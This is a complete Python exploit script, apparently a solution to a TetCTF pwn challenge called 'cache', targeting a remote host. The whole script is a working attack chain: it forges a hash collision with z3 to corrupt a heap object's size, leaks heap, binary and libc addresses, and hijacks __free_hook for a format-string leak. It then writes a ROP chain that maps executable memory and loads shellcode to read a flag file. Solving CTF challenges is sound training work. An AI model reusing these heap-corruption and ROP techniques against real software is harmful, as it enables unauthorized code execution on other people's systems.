#!/usr/bin/env python3
from pwn import *
import z3


def connect():
    if args.LOCAL:
        return gdb.debug(["./cache.dbg"], api=True)
    else:
        return remote("3.139.106.4", 27015)


# Adapted from libstdc++-v3/libsupc++/hash_bytes.cc.
def shift_mix(v):
    if isinstance(v, int):
        shifted = v >> 47
    else:
        shifted = z3.LShR(v, 47)
    return v ^ shifted


def hash_bytes(qwords):
    seed = 0xC70F6907
    mul = 0xC6A4A7935BD1E995
    len_ = len(qwords) * 8
    hash = seed ^ ((len_ * mul) & 0xFFFFFFFFFFFFFFFF)
    for qword in qwords:
        data = (
            shift_mix((qword * mul) & 0xFFFFFFFFFFFFFFFF) * mul
        ) & 0xFFFFFFFFFFFFFFFF
        hash ^= data
        hash = (hash * mul) & 0xFFFFFFFFFFFFFFFF
    hash = (shift_mix(hash) * mul) & 0xFFFFFFFFFFFFFFFF
    hash = shift_mix(hash)
    return hash


QWORD = 0x0807060504030201
QWORD1 = 0x40FEA1F3D0D88B99
QWORD2 = 0x7EFEA28D1124B387
HASH = 0x99619B0C363AB639
FREE_HOOK_OFF = 0x1EEB28
PRINTF_OFF = 0x64E10
MMAP_OFF = 0x11BA20
READ_OFF = 0x111130
SHELLCODE = asm(
    """
mov rax, 2  /* __NR_open */
lea rdi, [rip + path]
mov rsi, 0  /* O_RDONLY */
syscall

mov rdi, rax
mov rax, 0  /* __NR_read */
lea rsi, [rip + buf]
mov rdx, buf_end - buf
syscall

mov rdx, rax
mov rax, 1  /* __NR_write */
mov rdi, 1  /* STDOUT_FILENO */
lea rsi, [rip + buf]
syscall

path: .asciz "/home/cache/flag"
buf: .org $ + 0x100
buf_end:
""",
    arch="amd64",
)


def test():
    hash = hash_bytes([QWORD])
    assert hash == HASH, hex(hash)
    hash = hash_bytes([QWORD1, QWORD2])
    assert hash == HASH, hex(hash)
    qword_expr = z3.BitVec("qword", 64)
    z3_hash_expr = hash_bytes([qword_expr])
    z3_hash = z3.substitute(z3_hash_expr, (qword_expr, z3.BitVecVal(QWORD, 64)))
    z3_hash = z3.simplify(z3_hash).as_long()
    assert z3_hash == HASH, hex(z3_hash)


def gen_collision():
    qword1_expr = z3.BitVec("qword1", 64)
    qword2_expr = z3.BitVec("qword2", 64)
    z3_hash = hash_bytes([qword1_expr, qword2_expr])
    solver = z3.Solver()
    solver.append(z3_hash == HASH)
    result = solver.check()
    assert str(result) == "sat", result
    model = solver.model()
    return model[qword1_expr].as_long(), model[qword2_expr].as_long()


def create_cache(tube, name, size):
    tube.sendlineafter("> ", "1")
    tube.sendlineafter("Name: ", name)
    tube.sendlineafter("Size: ", str(size))


def read_from_cache(tube, name, offset, count):
    tube.sendlineafter("> ", "2")
    tube.sendlineafter("Name: ", name)
    tube.sendlineafter("Offset: ", str(offset))
    tube.sendlineafter("Count: ", str(count))
    return tube.recvn(count)


def write_to_cache(tube, name, offset, data):
    tube.sendlineafter("> ", "3")
    tube.sendlineafter("Name: ", name)
    tube.sendlineafter("Offset: ", str(offset))
    tube.sendlineafter("Count: ", str(len(data)))
    tube.sendafter("Data: ", data)


def erase_cache(tube, name):
    tube.sendlineafter("> ", "4")
    tube.sendlineafter("Name: ", name)


def alloc_cache(tube, name, size, letter):
    create_cache(tube, name, size)
    write_to_cache(tube, name, 0, letter * size)


def main():
    test()
    if args.GEN_COLLISION:
        qword1, qword2 = gen_collision()
    else:
        qword1, qword2 = QWORD1, QWORD2
    print("qword = 0x{:x}".format(QWORD))
    print("qword1 = 0x{:x}".format(qword1))
    print("qword2 = 0x{:x}".format(qword2))
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.Breakpoint("alarm", temporary=True)
            tube.gdb.continue_and_wait()
            tube.gdb.execute("set $rdi = 9999")
            tube.gdb.continue_nowait()
        # Allocate the victim cache.
        victim_name = struct.pack("<Q", QWORD)
        alloc_cache(tube, victim_name, 1, "V")
        # BUG: Overwrite its size using cache collision.
        create_cache(tube, struct.pack("<QQ", QWORD1, QWORD2), 0x1000000)
        # Generate an unsorted chunk.
        q_name = "Q" * 15
        alloc_cache(tube, q_name, 0x800, "Q")
        w_name = "W" * 15
        alloc_cache(tube, w_name, 1, "W")
        erase_cache(tube, q_name)
        # Leak heap.
        leak_size = 0x1000
        leak = read_from_cache(tube, victim_name, 0, leak_size)
        """
actual contents
    00000000  41 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │A···│····│····│····│
chunk size=0x30
    00000010  00 00 00 00  00 00 00 00  31 00 00 00  00 00 00 00  │····│····│1···│····│
    00000020  00 00 00 00  00 00 00 00  10 40 0c fe  e6 55 00 00  │····│····│·@··│·U··│
    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
chunk size=0x40
    00000040  00 00 00 00  00 00 00 00  41 00 00 00  00 00 00 00  │····│····│A···│····│
    00000050  b0 5e 0d fe  e6 55 00 00  90 60 0d fe  e6 55 00 00  │·^··│·U··│·`··│·U··│
                                        ^^^^^^^^^^^^^^^^^^^^^^^^
                                        c_str
    00000060  10 00 00 00  00 00 00 00  10 00 00 00  00 00 00 00  │····│····│····│····│
    00000070  00 00 00 00  00 00 00 00  39 b6 3a 36  0c 9b 61 99  │····│····│9·:6│··a·│
                                        ^^^^^^^^^^^^^^^^^^^^^^^^
                                        HASH
chunk size=0x20
    00000080  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │····│····│!···│····│
c_str:
    00000090  99 8b d8 d0  f3 a1 fe 40  87 b3 24 11  8d a2 fe 7e  │····│···@│··$·│···~│
"""
        (c_str,) = struct.unpack("<Q", leak[0x58:0x60])
        leak_addr = c_str - 0x90
        print("leak_addr = 0x{:x}".format(leak_addr))
        assert leak_addr & 0xF == 0
        w_off = 0x950
        print("w_addr = 0x{:x}".format(leak_addr + w_off))
        (cache_vtable,) = struct.unpack("<Q", leak[w_off : w_off + 8])
        print("cache_vtable = 0x{:x}".format(cache_vtable))
        pie = cache_vtable - 0xCC70
        print("pie = 0x{:x}".format(pie))
        assert pie & 0xFFF == 0
        (unsorted,) = struct.unpack("<Q", leak[0xF0:0xF8])
        libc = unsorted - 0x1EBBE0
        print("libc = 0x{:x}".format(libc))
        assert libc & 0xFFF == 0
        # Make W point to free_hook.
        buf = leak[: w_off + 8] + struct.pack("<QQ", libc + FREE_HOOK_OFF, 8)
        write_to_cache(tube, victim_name, 0, buf)
        # Overwrite free_hook with printf.
        # https://github.com/pr0cf5/CTF-writeups/tree/master/2019/hitcon#trick-or-treat
        write_to_cache(tube, w_name, 0, struct.pack("<Q", libc + PRINTF_OFF))
        u_name = "U" * 15
        create_cache(tube, u_name, 0x1000)
        stkidx2pos = 5
        rbp_stackidx = 3
        fmt = "rbp=<%{}$lx>".format(rbp_stackidx + stkidx2pos)
        write_to_cache(tube, u_name, 0, fmt.encode() + b"\x00")
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            tube.gdb.execute("break printf if *(char *)$rdi == 'r'")
            tube.gdb.continue_nowait()
        erase_cache(tube, u_name)
        if args.LOCAL:
            tube.gdb.wait()
            print(tube.gdb.execute("x/96a $rsp", to_string=True))
            """
0x7ffe0b5a46b8:	0x55584315c302 <sub_32BA+72>	0x7ffe0b5a46e0
0x7ffe0b5a46c8:	0x55584380a030	0x7ffe0b5a46f0
                                ^^^^^^^^^^^^^^
0x7ffe0b5a46d8:	0x55584315f6ba <sub_669A+32>	0x8299b9f7afa218c7
0x7ffe0b5a46e8:	0x55584380a028	0x7ffe0b5a4710
...
0x7ffe0b5a48b8:	0x55584315c012 <main+88>	0x0
"""
            tube.gdb.continue_nowait()
        tube.recvuntil("rbp=<")
        rbp = int(tube.recvuntil(">")[:-1], 16)
        print("rbp = 0x{:x}".format(rbp))
        retaddr = rbp + 0x1C8
        print("retaddr = 0x{:x}".format(retaddr))
        # Put the ROP chain at the location of return address to main().
        # It will be triggered when we return to main() from the last write.
        # mmap(addr@rdi, length@rsi, prot@rdx, flags@rcx, int fd@r8, offset@r9)
        # read(fd@rdi, buf@rsi, count@rdx)
        mmap_addr = 0x11110000
        mmap_length = 0x1000
        mmap_prot = 0x7  # PROT_READ | PROT_WRITE | PROT_EXEC
        mmap_flags = 0x32  # MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS
        mmap_fd = 0xFFFFFFFF
        mmap_offset = 0
        read_fd = 0  # STDIN_FILENO
        read_buf = mmap_addr
        read_count = mmap_length
        rop = b"".join(
            (
                # 0x4a550: pop rax ; ret
                # 0x1056fe: pop rcx ; pop rbx ; ret
                struct.pack("<QQ", libc + 0x4A550, libc + 0x1056FE),
                # 0x27529: pop rsi ; ret
                struct.pack("<QQ", libc + 0x27529, mmap_offset),
                # 0x81738: mov r9, rsi ; jmp rax
                struct.pack("<Q", libc + 0x81738),
                struct.pack("<QQ", mmap_flags, mmap_fd),
                # 0x11fdaa : mov r8, rbx ; mov rax, r8 ; pop rbx ; ret
                struct.pack("<QQ", libc + 0x11FDAA, 0),
                # 0x162866: pop rdx ; pop rbx ; ret
                struct.pack("<QQQ", libc + 0x162866, mmap_prot, 0),
                # 0x27529: pop rsi ; ret
                struct.pack("<QQ", libc + 0x27529, mmap_length),
                # 0x26b72 : pop rdi ; ret
                struct.pack("<QQ", libc + 0x26B72, mmap_addr),
                struct.pack("<Q", libc + MMAP_OFF),
                # 0x26b72 : pop rdi ; ret
                struct.pack("<QQ", libc + 0x26B72, read_fd),
                # 0x27529: pop rsi ; ret
                struct.pack("<QQ", libc + 0x27529, read_buf),
                # 0x162866: pop rdx ; pop rbx ; ret
                struct.pack("<QQQ", libc + 0x162866, read_count, 0),
                struct.pack("<Q", libc + READ_OFF),
                struct.pack("<Q", read_buf),
            )
        )
        leak = read_from_cache(tube, victim_name, 0, leak_size)
        buf = leak[: w_off + 8] + struct.pack("<QQ", retaddr, len(rop))
        write_to_cache(tube, victim_name, 0, buf)
        if args.LOCAL and False:
            # Debug shellcode.
            tube.gdb.interrupt_and_wait()
            tube.gdb.execute("b *0x{:x}".format(libc + READ_OFF))
            tube.gdb.continue_nowait()
        write_to_cache(tube, w_name, 0, rop)
        # Avoid sending shellcode alongside ROP, since std::cin may buffer it.
        time.sleep(1)
        # Send shellcode.
        tube.send(SHELLCODE)
        # TetCTF{https://www.youtube.com/watch?v=NvOHijJqups}
        # mobi: *100*400339067565#
        tube.interactive()


if __name__ == "__main__":
    main()
